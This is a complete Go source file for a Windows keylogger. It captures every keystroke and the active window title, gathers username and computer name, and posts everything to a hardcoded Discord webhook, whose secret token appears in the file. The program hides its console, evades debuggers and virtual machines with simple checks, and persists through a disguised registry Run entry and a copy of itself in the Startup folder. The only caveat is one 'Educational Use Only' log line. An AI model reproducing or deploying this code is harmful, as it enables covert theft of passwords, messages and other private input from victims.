package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/windows/registry"
)

const webhookURL = "https://discord.com/api/webhooks/1393190214238998598/RTf67SJLv3lWkdlSeYbSQZ8mM9kxPHMHSpTtXf1DYNhQmT_yWET1qIWKNBCpKdWi3Gx9"

type WebhookPayload struct {
	Content string  `json:"content"`
	Embeds  []Embed `json:"embeds,omitempty"`
}

type Embed struct {
	Title       string  `json:"title"`
	Description string  `json:"description"`
	Color       int     `json:"color"`
	Fields      []Field `json:"fields,omitempty"`
	Timestamp   string  `json:"timestamp,omitempty"`
}

type Field struct {
	Name   string `json:"name"`
	Value  string `json:"value"`
	Inline bool   `json:"inline"`
}

var (
	user32   = syscall.NewLazyDLL("user32.dll")
	kernel32 = syscall.NewLazyDLL("kernel32.dll")
	advapi32 = syscall.NewLazyDLL("advapi32.dll")

	procGetAsyncKeyState     = user32.NewProc("GetAsyncKeyState")
	procGetForegroundWindow  = user32.NewProc("GetForegroundWindow")
	procGetWindowTextW       = user32.NewProc("GetWindowTextW")
	procGetWindowTextLengthW = user32.NewProc("GetWindowTextLengthW")
	procGetUserNameW         = advapi32.NewProc("GetUserNameW")
	procGetComputerNameW     = kernel32.NewProc("GetComputerNameW")
	procGetTickCount         = kernel32.NewProc("GetTickCount")
	procIsDebuggerPresent    = kernel32.NewProc("IsDebuggerPresent")
)

// Virtual key codes
const (
	VK_LBUTTON    = 0x01
	VK_RBUTTON    = 0x02
	VK_BACK       = 0x08
	VK_TAB        = 0x09
	VK_RETURN     = 0x0D
	VK_SHIFT      = 0x10
	VK_CONTROL    = 0x11
	VK_MENU       = 0x12 // ALT
	VK_CAPITAL    = 0x14
	VK_ESCAPE     = 0x1B
	VK_SPACE      = 0x20
	VK_PRIOR      = 0x21 // PAGE UP
	VK_NEXT       = 0x22 // PAGE DOWN
	VK_END        = 0x23
	VK_HOME       = 0x24
	VK_LEFT       = 0x25
	VK_UP         = 0x26
	VK_RIGHT      = 0x27
	VK_DOWN       = 0x28
	VK_INSERT     = 0x2D
	VK_DELETE     = 0x2E
	VK_LWIN       = 0x5B
	VK_RWIN       = 0x5C
)

var keyNames = map[int]string{
	VK_BACK:    "[BACKSPACE]",
	VK_TAB:     "[TAB]",
	VK_RETURN:  "[ENTER]\n",
	VK_SHIFT:   "[SHIFT]",
	VK_CONTROL: "[CTRL]",
	VK_MENU:    "[ALT]",
	VK_CAPITAL: "[CAPSLOCK]",
	VK_ESCAPE:  "[ESC]",
	VK_SPACE:   " ",
	VK_PRIOR:   "[PAGEUP]",
	VK_NEXT:    "[PAGEDOWN]",
	VK_END:     "[END]",
	VK_HOME:    "[HOME]",
	VK_LEFT:    "[LEFT]",
	VK_UP:      "[UP]",
	VK_RIGHT:   "[RIGHT]",
	VK_DOWN:    "[DOWN]",
	VK_INSERT:  "[INSERT]",
	VK_DELETE:  "[DELETE]",
	VK_LWIN:    "[WIN]",
	VK_RWIN:    "[WIN]",
	0x70:       "[F1]", 0x71: "[F2]", 0x72: "[F3]", 0x73: "[F4]",
	0x74:       "[F5]", 0x75: "[F6]", 0x76: "[F7]", 0x77: "[F8]",
	0x78:       "[F9]", 0x79: "[F10]", 0x7A: "[F11]", 0x7B: "[F12]",
}

func sendToWebhook(content string, embed *Embed) {
	payload := WebhookPayload{
		Content: content,
	}
	
	if embed != nil {
		payload.Embeds = []Embed{*embed}
	}

	jsonData, err := json.Marshal(payload)
	if err != nil {
		log.Printf("JSON marshal error: %v", err)
		return
	}

	client := &http.Client{Timeout: 15 * time.Second}
	req, err := http.NewRequest("POST", webhookURL, bytes.NewBuffer(jsonData))
	if err != nil {
		return
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
	
	resp, err := client.Do(req)
	if err != nil {
		log.Printf("Webhook send error: %v", err)
		return
	}
	defer resp.Body.Close()
	
	if resp.StatusCode != 200 && resp.StatusCode != 204 {
		log.Printf("Webhook bad status: %d", resp.StatusCode)
	}
}

func addToStartup() error {
	exePath, err := os.Executable()
	if err != nil {
		return err
	}

	// Add to Registry Run
	key, err := registry.OpenKey(registry.CURRENT_USER, `SOFTWARE\Microsoft\Windows\CurrentVersion\Run`, registry.SET_VALUE)
	if err == nil {
		defer key.Close()
		key.SetStringValue("WindowsSystemManager", exePath)
		log.Println("Added to registry startup")
	}

	// Add to Startup Folder
	startupPath := filepath.Join(os.Getenv("APPDATA"), `Microsoft\Windows\Start Menu\Programs\Startup`)
	targetPath := filepath.Join(startupPath, "SystemManager.exe")
	
	source, err := os.Open(exePath)
	if err == nil {
		defer source.Close()
		destination, err := os.Create(targetPath)
		if err == nil {
			defer destination.Close()
			_, err = io.Copy(destination, source)
			if err == nil {
				log.Println("Added to startup folder")
			}
		}
	}

	return nil
}

func getActiveWindow() string {
	hwnd, _, _ := procGetForegroundWindow.Call()
	if hwnd == 0 {
		return "Unknown"
	}

	length, _, _ := procGetWindowTextLengthW.Call(hwnd)
	if length == 0 {
		return "Unknown"
	}

	buf := make([]uint16, length+1)
	procGetWindowTextW.Call(hwnd, uintptr(unsafe.Pointer(&buf[0])), length+1)
	return syscall.UTF16ToString(buf)
}

func getSystemInfo() map[string]string {
	info := make(map[string]string)
	
	// Username
	var username [257]uint16
	var size uint32 = 257
	procGetUserNameW.Call(uintptr(unsafe.Pointer(&username[0])), uintptr(unsafe.Pointer(&size)))
	info["username"] = syscall.UTF16ToString(username[:])

	// Computer name
	var computerName [257]uint16
	var compSize uint32 = 257
	procGetComputerNameW.Call(uintptr(unsafe.Pointer(&computerName[0])), uintptr(unsafe.Pointer(&compSize)))
	info["computername"] = syscall.UTF16ToString(computerName[:])

	// System info
	info["os"] = runtime.GOOS
	info["arch"] = runtime.GOARCH
	info["cores"] = strconv.Itoa(runtime.NumCPU())
	
	hostname, _ := os.Hostname()
	info["hostname"] = hostname
	
	wd, _ := os.Getwd()
	info["working_dir"] = wd
	
	info["timestamp"] = time.Now().Format("2006-01-02 15:04:05")

	return info
}

func isKeyPressed(keyCode int) bool {
	ret, _, _ := procGetAsyncKeyState.Call(uintptr(keyCode))
	return (ret & 0x8000) != 0
}

func getCapsLockState() bool {
	// GetKeyState for toggle states like CapsLock
	user32 := syscall.MustLoadDLL("user32.dll")
	getKeyState := user32.MustFindProc("GetKeyState")
	ret, _, _ := getKeyState.Call(uintptr(VK_CAPITAL))
	return (ret & 0x0001) != 0
}

func virtualKeyToChar(vkCode int, isShift bool) string {
	// Check for named keys first
	if name, exists := keyNames[vkCode]; exists {
		return name
	}

	// Letters A-Z
	if vkCode >= 0x41 && vkCode <= 0x5A {
		capsLock := getCapsLockState()
		if (isShift && !capsLock) || (!isShift && capsLock) {
			return string(rune(vkCode)) // Uppercase
		} else {
			return string(rune(vkCode + 32)) // Lowercase
		}
	}

	// Numbers 0-9
	if vkCode >= 0x30 && vkCode <= 0x39 {
		if isShift {
			switch vkCode {
			case 0x30: return ")"
			case 0x31: return "!"
			case 0x32: return "@"
			case 0x33: return "#"
			case 0x34: return "$"
			case 0x35: return "%"
			case 0x36: return "^"
			case 0x37: return "&"
			case 0x38: return "*"
			case 0x39: return "("
			}
		}
		return string(rune(vkCode))
	}

	// Numpad
	if vkCode >= 0x60 && vkCode <= 0x69 {
		return string(rune(vkCode - 0x30))
	}

	// Special characters
	switch vkCode {
	case 0xBA: if isShift { return ":" } else { return ";" }
	case 0xBB: if isShift { return "+" } else { return "=" }
	case 0xBC: if isShift { return "<" } else { return "," }
	case 0xBD: if isShift { return "_" } else { return "-" }
	case 0xBE: if isShift { return ">" } else { return "." }
	case 0xBF: if isShift { return "?" } else { return "/" }
	case 0xC0: if isShift { return "~" } else { return "`" }
	case 0xDB: if isShift { return "{" } else { return "[" }
	case 0xDC: if isShift { return "|" } else { return "\\" }
	case 0xDD: if isShift { return "}" } else { return "]" }
	case 0xDE: if isShift { return "\"" } else { return "'" }
	}

	return fmt.Sprintf("[VK:%02X]", vkCode)
}

func antiAnalysis() bool {
	// Check for debugger
	isDebugger, _, _ := procIsDebuggerPresent.Call()
	if isDebugger != 0 {
		return false
	}

	// Check tick count (simple VM detection)
	tick1, _, _ := procGetTickCount.Call()
	time.Sleep(500 * time.Millisecond)
	tick2, _, _ := procGetTickCount.Call()
	
	if (tick2 - tick1) < 100 {
		return false // Likely in VM or debugger
	}

	return true
}

func main() {
	// Simple anti-analysis
	if !antiAnalysis() {
		os.Exit(1)
	}

	// Hide console window in release
	kernel32.NewProc("FreeConsole").Call()

	// Add persistence
	if err := addToStartup(); err != nil {
		log.Printf("Startup error: %v", err)
	}

	// Send system info
	systemInfo := getSystemInfo()
	embed := &Embed{
		Title:       "🖥️ System Session Started",
		Description: "Monitoring session activated successfully",
		Color:       0x00FF00,
		Timestamp:   time.Now().Format(time.RFC3339),
		Fields: []Field{
			{Name: "👤 Username", Value: systemInfo["username"], Inline: true},
			{Name: "💻 Computer", Value: systemInfo["computername"], Inline: true},
			{Name: "🏠 Hostname", Value: systemInfo["hostname"], Inline: true},
			{Name: "⚙️ Architecture", Value: systemInfo["arch"], Inline: true},
			{Name: "🔢 CPU Cores", Value: systemInfo["cores"], Inline: true},
			{Name: "📁 Directory", Value: systemInfo["working_dir"], Inline: true},
		},
	}
	sendToWebhook("", embed)

	log.Println("Advanced Keylogger Started - Educational Use Only")

	// Key tracking variables
	keyBuffer := strings.Builder{}
	lastSend := time.Now()
	lastWindow := ""
	lastWindowTime := time.Now()
	
	// Track key states to prevent repetition
	keyStates := make(map[int]bool)

	for {
		currentWindow := getActiveWindow()
		
		// Window change detection
		if currentWindow != lastWindow && time.Since(lastWindowTime) > 2*time.Second {
			if lastWindow != "" {
				embed := &Embed{
					Title:     "🔄 Window Focus Changed",
					Color:     0xFFFF00,
					Timestamp: time.Now().Format(time.RFC3339),
					Fields: []Field{
						{Name: "Previous", Value: lastWindow, Inline: true},
						{Name: "Current", Value: currentWindow, Inline: true},
					},
				}
				sendToWebhook("", embed)
			}
			lastWindow = currentWindow
			lastWindowTime = time.Now()
		}

		// Check all relevant keys (8-255 covers most keys)
		for vkCode := 8; vkCode <= 255; vkCode++ {
			currentlyPressed := isKeyPressed(vkCode)
			wasPressed := keyStates[vkCode]

			if currentlyPressed && !wasPressed {
				// Key was just pressed
				keyStates[vkCode] = true
				
				// Get shift state
				shiftPressed := isKeyPressed(VK_SHIFT)
				
				// Convert virtual key to character
				char := virtualKeyToChar(vkCode, shiftPressed)
				
				// Add to buffer
				keyBuffer.WriteString(char)
				
				// Log special keys immediately
				if vkCode == VK_SHIFT || vkCode == VK_CONTROL || vkCode == VK_MENU {
					embed := &Embed{
						Title:     "⌨️ Special Key Pressed",
						Color:     0xFFA500,
						Timestamp: time.Now().Format(time.RFC3339),
						Fields: []Field{
							{Name: "Key", Value: char, Inline: true},
							{Name: "Window", Value: currentWindow, Inline: true},
						},
					}
					sendToWebhook("", embed)
				}
				
			} else if !currentlyPressed && wasPressed {
				// Key was released
				keyStates[vkCode] = false
			}
		}

		// Send buffered keystrokes
		currentTime := time.Now()
		if keyBuffer.Len() > 0 {
			shouldSend := false
			
			// Send conditions:
			// 1. Buffer is large enough (50+ chars)
			// 2. Enough time passed since last send (15+ seconds)
			// 3. Recent activity stopped (3+ seconds since last key)
			if keyBuffer.Len() >= 50 ||
				currentTime.Sub(lastSend) > 15*time.Second ||
				(keyBuffer.Len() > 0 && currentTime.Sub(lastSend) > 3*time.Second) {
				shouldSend = true
			}

			if shouldSend {
				text := keyBuffer.String()
				if len(strings.TrimSpace(text)) > 0 {
					// Truncate very long messages for Discord
					if len(text) > 1500 {
						text = text[:1500] + "...[truncated]"
					}
					
					embed := &Embed{
						Title:       "⌨️ Keystroke Capture",
						Description: fmt.Sprintf("**Window:** %s\n```\n%s\n```", currentWindow, text),
						Color:       0x0099FF,
						Timestamp:   currentTime.Format(time.RFC3339),
					}
					sendToWebhook("", embed)
					
					keyBuffer.Reset()
					lastSend = currentTime
				}
			}
		}

		// Reduce CPU usage
		time.Sleep(10 * time.Millisecond)
	}
}